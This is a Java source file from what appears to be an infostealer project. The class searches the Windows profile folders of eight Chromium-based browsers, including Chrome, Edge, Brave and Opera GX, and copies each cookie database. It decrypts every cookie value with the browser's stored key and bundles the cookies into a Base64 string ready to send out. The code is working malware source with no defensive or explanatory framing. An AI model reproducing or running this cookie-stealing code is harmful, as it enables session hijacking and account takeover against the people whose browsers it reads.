package io.github.luxotick.impl.cookies;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import io.github.luxotick.Sender;
import io.github.luxotick.utils.DecryptUtil;
import io.github.luxotick.utils.DriverUtil;
import io.github.luxotick.utils.KeyUtil;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

import java.io.File;
import java.nio.file.Files;
import java.sql.Connection;
import java.sql.ResultSet;
import java.util.Base64;
import java.util.HashMap;
import java.util.Properties;

public class All {
    private static final File appData = new File(System.getenv("APPDATA"));
    private static final File localAppData = new File(System.getenv("LOCALAPPDATA"));
    public static final HashMap<String, String> paths = new HashMap<String, String>() {
        {
            String A = "\\Google\\Chrome\\User Data";
            String B = "\\Microsoft\\Edge\\User Data";
            String C = "\\Chromium\\User Data";
            String D = "\\Opera Software\\Opera Stable";
            String E = "\\Opera Software\\Opera GX Stable";
            String F = "\\BraveSoftware\\Brave-Browser\\User Data";
            String G = "\\Vivaldi\\User Data";
            String H = "\\Yandex\\YandexBrowser\\User Data";
            put("Google Chrome", localAppData + A);
            put("Microsoft Edge", localAppData + B);
            put("Chromium", localAppData + C);
            put("Opera", appData + D);
            put("Opera GX", appData + E);
            put("Brave", localAppData + F);
            put("Vivaldi", localAppData + G);
            put("Yandex", localAppData + H);
        }
    };

    private final JsonArray cookies = new JsonArray();

    public String grabCookies() {
        crawlUserData();
        String cookieStr = "";
        for (JsonElement cookie : cookies) {
            cookieStr += cookie.getAsJsonObject().get("hostKey").getAsString() + "\t" + "TRUE" + "\t" + "/" + "\t" + "FALSE" + "\t" + "2597573456" + "\t" + cookie.getAsJsonObject().get("name").getAsString() + "\t" + cookie.getAsJsonObject().get("value").getAsString() + "\n";
        }
        return Base64.getEncoder().encodeToString(cookieStr.getBytes());
    }

    private void crawlUserData() {
        for (String browser : paths.keySet()) {
            File userData = new File(paths.get(browser));
            if (!userData.exists()) continue;
            byte[] key = KeyUtil.getKey(new File(userData, "Local State"));
            File networkDir = new File(userData, "\\Default\\Network");
            if (!networkDir.exists()) continue;
            for (File data : networkDir.listFiles()) {
                if (data.getName().equals("Cookies")) {
                    crawlCookies(data, key);
                }
            }
        }


    }

    private void crawlCookies(File cookieFile, byte[] key) {
        try {
            File tempCookieData = File.createTempFile("TempCookies", null);
            tempCookieData.deleteOnExit();
            Files.copy(cookieFile.toPath(), tempCookieData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            java.sql.Driver driver = DriverUtil.getDriver();
            Properties props = new Properties();
            Connection connection = driver.connect("jdbc:sqlite:" + tempCookieData.getAbsolutePath(), props);
            ResultSet resultSet = connection.createStatement().executeQuery("SELECT host_key, name, encrypted_value FROM cookies");
            while (resultSet.next()) {
                String hostKey = resultSet.getString(1);
                String name = resultSet.getString(2);
                byte[] encryptedValue = resultSet.getBytes(3);
                if (hostKey != null && name != null && encryptedValue != null) {
                    String decryptedValue = DecryptUtil.decrypt(encryptedValue, key);
                    if (!decryptedValue.equals("")) {
                        JsonObject cookie = new JsonObject();
                        cookie.addProperty("hostKey", hostKey);
                        cookie.addProperty("name", name);
                        cookie.addProperty("value", decryptedValue);
                        cookies.add(cookie);
                    }
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}